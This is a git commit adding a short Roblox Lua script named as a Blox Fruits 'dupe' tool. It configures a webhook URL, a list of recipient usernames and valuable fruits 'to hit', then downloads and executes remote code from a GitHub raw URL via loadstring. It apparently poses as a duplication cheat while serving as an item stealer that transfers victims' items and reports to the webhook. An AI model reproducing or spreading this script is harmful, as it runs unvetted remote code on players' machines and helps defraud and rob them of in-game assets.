8f954fe7624d97d366b229a62277253e203aeb87
NaruTeam <naruteamservice@gmail.com>
2025-03-29 22:00:04 +0700

    Create DupeFruitsV4.2.lua

---
+++ DupeFruitsV4.2.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=NkR3c1BKMzJmNFhaRlNnTDNwZkFQUTpJTm1UR3U2dWxibnVBaWdOUnJIYnVjX1VkWFUzZmNKMDIxWV85SjA1bTFkV2pTOV9VNEM2YWJhUkRpRUlJaFBpTFd1S2dicVgzbUdSNzlVUXJOTENRd0RXMWtRQmdMSmtERGJVZnNDNVJ6dlhlZFlqS0JmVkJLbFJ1bkVBeTh1NVpRQzJjc2FXMzhpbFFFTlY1SHFIamUwU0VpWnNYSW52ZGlSb294eldfNGc"
+Usernames = {"tranchicong24-forfylgdiil-fritzowjr-tarronfj-mfzgnr-GONNN00-HTNTPbloxfruit"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Gas-Gas", "Dough-Dough"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
